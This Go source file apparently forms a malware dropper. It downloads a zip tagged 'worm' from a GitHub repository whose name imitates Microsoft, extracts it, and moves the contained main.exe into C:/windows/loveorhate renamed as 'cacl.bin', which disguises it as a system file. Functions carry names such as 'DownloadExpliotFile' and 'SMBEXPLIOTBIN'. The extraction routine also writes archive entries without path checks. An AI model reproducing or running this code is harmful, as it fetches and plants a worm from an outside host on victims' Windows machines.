package pack

import (
	"archive/zip"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

func DownloadExpliotFile(url, destination string) error {
	// Create the file
	out, err := os.Create(destination)
	if err != nil {
		return err
	}
	defer out.Close()

	// Download the file
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func unzipFile(zipFile, destFolder string) error {
	// Open the zip file
	r, err := zip.OpenReader(zipFile)
	if err != nil {
		return err
	}
	defer r.Close()

	// Create the destination folder if it doesn't exist
	if err := os.MkdirAll(destFolder, 0755); err != nil {
		return err
	}

	// Extract each file
	for _, file := range r.File {
		path := filepath.Join(destFolder, file.Name)

		// Create directories
		if file.FileInfo().IsDir() {
			os.MkdirAll(path, file.Mode())
			continue
		}

		// Create the file
		fileReader, err := file.Open()
		if err != nil {
			return err
		}
		defer fileReader.Close()

		targetFile, err := os.Create(path)
		if err != nil {
			return err
		}
		defer targetFile.Close()

		// Copy file contents
		_, err = io.Copy(targetFile, fileReader)
		if err != nil {
			return err
		}
	}

	return nil
}
 
func SMBEXPLIOTBIN() {
	url := "https://github.com/MicrosoftMalwareDefender/Lovers/archive/refs/tags/worm.zip"
	destination := "C:/example.zip"
	extractFolder := "C:/extracted"
	loveOrHateFolder := "C:/windows/loveorhate"

	fmt.Println("Downloading file...")
	err := DownloadExpliotFile(url, destination)
	if err != nil {
		fmt.Println("Error downloading file:", err)
		return
	}
	fmt.Println("File downloaded successfully.")

	fmt.Println("Extracting file...")
	err = unzipFile(destination, extractFolder)
	if err != nil {
		fmt.Println("Error extracting file:", err)
		return
	}
	fmt.Println("File extracted successfully.")

	loversWormFolder := filepath.Join(extractFolder, "Lovers-worm")
	executablePath := filepath.Join(loversWormFolder, "main.exe")

	// Check if the Lovers-worm folder exists
	if _, err := os.Stat(loversWormFolder); os.IsNotExist(err) {
		fmt.Println("Lovers-worm folder not found.")
		return
	}

	// Check if the main.exe file exists
	if _, err := os.Stat(executablePath); os.IsNotExist(err) {
		fmt.Println("main.exe not found in Lovers-worm folder.")
		return
	}

	// Create the loveorhate folder if it doesn't exist
	os.MkdirAll(loveOrHateFolder, 0755)

	// Move the main.exe to C:/windows/loveorhate and rename to cacl.bin
	newExecutablePath := filepath.Join(loveOrHateFolder, "cacl.bin")
	err = os.Rename(executablePath, newExecutablePath)
	if err != nil {
		fmt.Println("Error moving and renaming main.exe:", err)
		return
	}

	fmt.Println("main.exe moved and renamed to cacl.bin successfully.")
}
